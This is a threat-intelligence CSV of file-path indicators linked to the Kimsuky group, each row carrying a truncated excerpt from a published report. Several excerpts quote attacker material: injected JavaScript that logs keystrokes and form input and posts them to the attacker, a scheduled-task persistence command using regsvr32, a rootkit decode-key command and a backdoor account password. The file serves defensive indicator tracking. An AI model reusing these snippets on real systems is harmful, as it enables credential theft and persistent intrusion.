schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:c155cef34a77ce7e815fcdeb10d724c0db9e0440b71c43dbc42bddf4239ba5c1,observation--sha256:cd7ea0f3c5a019b62e552e17400c8ed97efbcae5921681c9d517544d43c7b5df,file-path,/home/ssktool/public_ht,/home/ssktool/public_ht,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:e11ce0ff6fd32d262eefd747fec11ad66ab8e707ed34700a0e65e8c5b9712cfc,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 424}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,combination (see below). The LKM communicates via `/proc/acpi/pcicard` with,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:ecbfb5908b9f2e3567f859b8a2578c61afa7a23dfd18d17dc9fb963026299a3b,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 446}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,Creates /proc/acpi/pcicard to communicate with the userland:,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8420449499304692d5c4642e0ccff6abbe102a3492dccce1d49c957c429cd5bb,observation--sha256:834bdd0870f41022b71efa342ef119a1e7b30cdc68c2f18fff298f49de97fcac,file-path,/proc/acpi/pcicard,/proc/acpi/pcicard,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 449}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"echo -n ""${DECODEKEY}"" > /proc/acpi/pcicard",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ece4485c673e155299bfbd6a0715d1fd798e32cbaea89721ea88d9f2292dff24,observation--sha256:79fe6b4f2c4cdb7e20824a2c9a877bb5b646d86f8035c055580f72ed7fdec525,file-path,/tmp/abc,/tmp/abc,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:bf8dc1589a7ea626062a6a3b622a452bfd3d746fb19b0c141ea546404ef28e86,observation--sha256:e40a243426707b1946916d4b4094926ba3118948548a775a693f51e2923e3c77,file-path,/tmp/abc.e,/tmp/abc.e,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:e3c12ee61cd8d6e2be99ae624c92495e649fad26c12627472410ce58863d6f70,observation--sha256:b49e34059924a05a512d954f905926e8092734ab9003ddc50a97449cf6c6eba5,file-path,C:\ mounted (hgfs). Dumped included.,C:\ mounted (hgfs). Dumped included,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 134}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,The guest VM had the host's C:\ mounted (hgfs). Dumped included.,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b68f52f7ec057480d40bec6089b8dc05c1834421d5b8ed1a5f7cdcd9bdc5f482,observation--sha256:d44d6d6a60e16055c6bc7b8bc29a9d606e0ea88cd92bed59dee421132888a9bd,file-path,C:\ProgramData\Intel\,C:\ProgramData\Intel\,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:37d0167ca707806e442c76edfc5c2b1c42b95265d373aa944fe3a3902df22389,observation--sha256:de5a1ae8fd3eb1c13352b9efcb2a10fa4fc69e644973996fac7c042715f03b49,file-path,C:\ProgramData\Intel\Driverdriver.cfg,C:\ProgramData\Intel\Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:37d0167ca707806e442c76edfc5c2b1c42b95265d373aa944fe3a3902df22389,observation--sha256:f2e39fb7b8a48e46f7f7940d22f789a007f5a9b726e2b194ea58e1eb7b7cc36b,file-path,C:\ProgramData\Intel\Driverdriver.cfg,C:\ProgramData\Intel\Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:0e4605e36b793ea9c36cc11ef33ea1441875b6a859f9a9d5a92e598a2069b5cb,observation--sha256:02d7787b50a35e26a23915379e63cb5e9b625dac7c074473a269730fa9b18619,file-path,C:\ProgramData\Intel\Driverdriver.cfg (b1cad7fa7d7168fd3b8ff853d266b669),C:\ProgramData\Intel\Driverdriver.cfg (b1cad7fa7d7168fd3b8ff853d266b669,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:b919ea7286c46a4fc51937241fb8a9e7201871f04de2f53d8d002c38f72fc5a2,observation--sha256:b33b95c7d18ba5735379d356fbbd05ca228cb195f0a13ee727aa1fa7695a2cdc,file-path,C:\ProgramData\Microsoft\Windows\Start,C:\ProgramData\Microsoft\Windows\Start,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b919ea7286c46a4fc51937241fb8a9e7201871f04de2f53d8d002c38f72fc5a2,observation--sha256:d90dc3b062885036dbf6da5e3e716f6ad1fb1c36a1dcb07b24302a56be78d871,file-path,C:\ProgramData\Microsoft\Windows\Start,C:\ProgramData\Microsoft\Windows\Start,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a489b1bfb0677c829d3eff0d9cadfef3b9d2dcdc93cca03a01b0a9a823d91954,observation--sha256:c97c693afd8466e91a6a31f15ca85aec678b4832e3e47434774cc7ef3c1612b9,file-path,C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll,C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 18}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 18 VIRUS BULLETIN CONFERENCE OCTOBER 2021 In the case of sending and receiving mail internally, due to the fact that the internal mail didn’t go through a separate security solution, executable malware could be distributed. V3 Update_3.5.1.exe (Dropper): 686e3874b772c806e0809fcb933b50ff C:\ProgramData\Software\Microsoft\Windows\Defender\AutoUpdate.dll (AppleSeed):46c4c19a61e034e7b35e70c459f5692f dropper-regsvr32(x86).dll(",
1.0.0,actor--kimsuky,artifact--sha256:259fc4cf9259a13c403d7cb1c357dc1984314daf9d4f44eaee25dd2407125313,observation--sha256:ad4f7abb6d0ce7dbe6fca71b6f7ff02ac19775fc8bc640a364b61048c851b24b,file-path,C:\ProgramData\winlogon.exe,C:\ProgramData\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:259fc4cf9259a13c403d7cb1c357dc1984314daf9d4f44eaee25dd2407125313,observation--sha256:b262ffc4d9f0617dc44ac520539fc5b76f43e159a6ca6a8e82806bf51a787ec6,file-path,C:\ProgramData\winlogon.exe,C:\ProgramData\winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d1af7d1a852398b1cd454e39490dd02b5612b3cb0f0b227d8facbed67c06c222,observation--sha256:d46711b414092a80edd2302bbd0781553081aa143eab399b5942b5a9aadb5d40,file-path,C:\Users\,C:\Users\,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:a0a19df5d72da9fb8a516d72537c00b824e57baae2ef1b4f275163a902e6f1f0,observation--sha256:e65b7efbe4e3fc60593401332971506b99fa16492ae905f0ad403611d6b04f6a,file-path,C:\Users\Administrator\AppData\Local\Temp\OneNot,C:\Users\Administrator\AppData\Local\Temp\OneNot,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6a9ceded71d49a0c8724212d9f534744f76b9ef9e0325eae777a4f758e2d6756,observation--sha256:8aa57fed54e87acfdb244b25dec8f3fce11efdd57a22de443be5a22cba26e714,file-path,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3782c199f572c12bc53f53a1c1fcb5a03cd5158c3fc58bd7657a2990ed6785de,observation--sha256:285047b486c18a3e51985cba123cbd230a3d42b31193dc49f506bbb0679f5efd,file-path,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start,C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:428447f9b754b36b1da50ae6022e3fa859f4328232330755c01cdc9430b68698,observation--sha256:f98b74ead4286b7097eb3f53a07c70494dc9b347a14fdfe7560c2baea5fda615,file-path,C:\Users\Administrator\AppData\Roaming\winlogon.exe,C:\Users\Administrator\AppData\Roaming\winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:428447f9b754b36b1da50ae6022e3fa859f4328232330755c01cdc9430b68698,observation--sha256:419364a76ab3cc4971adabcc871f7e854e4d3d783e4356096a04bb7928f02d3e,file-path,C:\Users\Administrator\AppData\Roaming\winlogon.exe,C:\Users\Administrator\AppData\Roaming\winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4cceedb83c9c772cde1322b014f34d30cf2c2c0d64209fb85736d23901aa22a4,observation--sha256:6ac50c575f65440699b4e401b6f4cab4602a90a8e066276da0df1eee15ae65bc,file-path,C:\Users\Administrator\Desktop\Proxy  Collection\tools\svchost.exe,C:\Users\Administrator\Desktop\Proxy Collection\tools\svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9d9133518fe97d6562786a58a9610380d37c2eca6b6e9628c1caeb044dc577a2,observation--sha256:83fd787e717a7c81412cccc1ed45c0033705229e9d790c91fbd2a99f6bee8ab6,file-path,C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe,C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3b913e6cc0248db5494ec8487bb57ac8dc16da9c8995962ff547e5b042edefb5,observation--sha256:9b773881005e59cfa77626de31eecdd945e877b74ed2304a3e0c616b827eecc2,file-path,C:\Users\Administrator\Downloads\exection\ms_x64.dll,C:\Users\Administrator\Downloads\exection\ms_x64.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6afebac6087d9cc5b1272a09caa514986aa39c73289960bb84c7aa6d4eb678f6,observation--sha256:b73b4035f76b06b4601f03ee729804dcca3408d44c32cbfdea67ce0f807f8e36,file-path,C:\Users\Administrator\Downloads\passwod.txt.lnk,C:\Users\Administrator\Downloads\passwod.txt.lnk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
